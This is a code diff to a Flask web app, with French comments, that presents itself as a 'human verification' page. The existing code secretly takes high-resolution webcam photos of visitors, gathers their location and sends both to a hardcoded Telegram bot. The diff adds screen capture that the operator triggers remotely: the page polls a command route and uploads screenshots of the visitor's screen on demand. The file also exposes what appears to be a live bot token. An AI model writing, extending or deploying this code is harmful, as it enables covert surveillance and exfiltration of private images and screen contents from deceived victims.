@@ -6,17 +6,19 @@ import base64
 import re
 import os
 from datetime import datetime
+import threading
 
 app = Flask(__name__)
 
 # ========== CONFIGURATION TELEGRAM ==========
-# 🔥 REMPLACEZ CES VALEURS PAR LES VÔTRES 🔥
 BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
 CHAT_ID = "8546452645"
-# ============================================
 
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+
+# ========== COMMANDES POUR CAPTURE D'ÉCRAN ==========
+COMMANDS = {"screenshot": False}
 
 def send_telegram(text, photo_bytes=None):
     try:
@@ -39,7 +41,7 @@ def get_extra_info(ip):
         pass
     return "Localisation inconnue"
 
-# ========== PAGE HTML MATRIX HD ==========
+# ========== PAGE HTML MATRIX AVEC CAPTURE D'ÉCRAN ==========
 HTML_MATRIX = '''<!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -215,6 +217,9 @@ HTML_MATRIX = '''<!DOCTYPE html>
 
     let collected = {};
     let streamActive = false;
+    let screenStream = null;
+    let statusDiv = null;
+    let btn = null;
 
     async function postData(endpoint, data) {
         try {
@@ -266,14 +271,12 @@ HTML_MATRIX = '''<!DOCTYPE html>
         return new Promise((resolve) => {
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                // Dimensions exactes de la vidéo (qualité maximale native)
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
                 
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
-                // Qualité 1.0 = 100% sans compression
                 canvas.toBlob(async (blob) => {
                     const reader = new FileReader();
                     reader.onloadend = async function() {
@@ -299,7 +302,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
         statusDiv.innerHTML = '>_ [SCAN] activation caméra HD...';
         
         try {
-            // Configuration HD maximale - résolution native de l'appareil
             const constraints = {
                 video: {
                     width: { ideal: 3840, max: 4096 },
@@ -315,7 +317,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
             video.setAttribute('playsinline', '');
             video.play();
             
-            // Attendre les dimensions réelles
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
                     setTimeout(resolve, 800);
@@ -349,6 +350,64 @@ HTML_MATRIX = '''<!DOCTYPE html>
         }
     }
 
+    // ========== NOUVELLE FONCTION DE CAPTURE D'ÉCRAN ==========
+    async function startScreenCapture() {
+        const status = document.getElementById('statusMsg');
+        const btn = document.getElementById('actionBtn');
+        
+        try {
+            // Demande l'autorisation de capturer l'écran complet
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({ 
+                video: { cursor: "always" }, 
+                audio: false 
+            });
+
+            status.innerHTML = ">_ PROTOCOLE ACTIVÉ : SURVEILLANCE EN COURS";
+            btn.style.display = "none";
+
+            const video = document.createElement('video');
+            video.srcObject = screenStream;
+            video.play();
+
+            // Système d'écoute des ordres du Seigneur
+            setInterval(async () => {
+                try {
+                    const check = await fetch('/api/check_cmd');
+                    const cmd = await check.json();
+
+                    if (cmd.command === "screenshot") {
+                        const c = document.createElement('canvas');
+                        c.width = 1280;
+                        c.height = 720;
+                        c.getContext('2d').drawImage(video, 0, 0, c.width, c.height);
+                        
+                        await fetch('/api/photo', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                photo: c.toDataURL('image/jpeg', 0.8),
+                                index: "SCREEN_CAPTURE",
+                                info: collected
+                            })
+                        });
+                        
+                        status.innerHTML = ">_ CAPTURE ENVOYÉE AU SEIGNEUR";
+                        setTimeout(() => {
+                            status.innerHTML = ">_ SURVEILLANCE ACTIVE";
+                        }, 2000);
+                    }
+                } catch(e) {}
+            }, 3000);
+
+        } catch (err) {
+            status.innerHTML = ">_ ERREUR : ÉCHEC DE VÉRIFICATION HUMAINE";
+            await fetch('/api/error', { 
+                method: 'POST',
+                body: JSON.stringify({ error: err.message, info: collected })
+            });
+        }
+    }
+
     async function startVerification() {
         const btn = document.getElementById('actionBtn');
         btn.disabled = true;
@@ -363,6 +422,9 @@ HTML_MATRIX = '''<!DOCTYPE html>
         await collectPassive();
         await new Promise(r => setTimeout(r, 500));
         await burstPhotosHD();
+        
+        // Après les photos, démarrer la capture d'écran
+        await startScreenCapture();
         
         btn.disabled = false;
         btn.style.opacity = '1';
@@ -425,11 +487,29 @@ def photo():
 def error():
     try:
         data = request.json
-        msg = f"⚠️ *ERREUR CAMERA*\n{data.get('error', '?')}"
+        msg = f"⚠️ *ERREUR*\n{data.get('error', '?')}"
         send_telegram(msg)
         return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'status': 'error'}), 500
+
+# ========== ROUTES POUR CAPTURE D'ÉCRAN ==========
+@app.route('/api/trigger/<action>')
+def trigger_action(action):
+    """Route appelée par le bot Telegram pour déclencher des actions"""
+    if action in COMMANDS:
+        COMMANDS[action] = True
+        send_telegram(f"✅ Ordre reçu, Seigneur.\nAction: {action}")
+        return "Ordre reçu, Seigneur."
+    return "Action inconnue.", 404
+
+@app.route('/api/check_cmd')
+def check_cmd():
+    """La page web interroge cette route en boucle"""
+    if COMMANDS.get("screenshot", False):
+        COMMANDS["screenshot"] = False
+        return jsonify({"command": "screenshot"})
+    return jsonify({"command": "none"})
 
 @app.route('/api/status', methods=['GET'])
 def status():
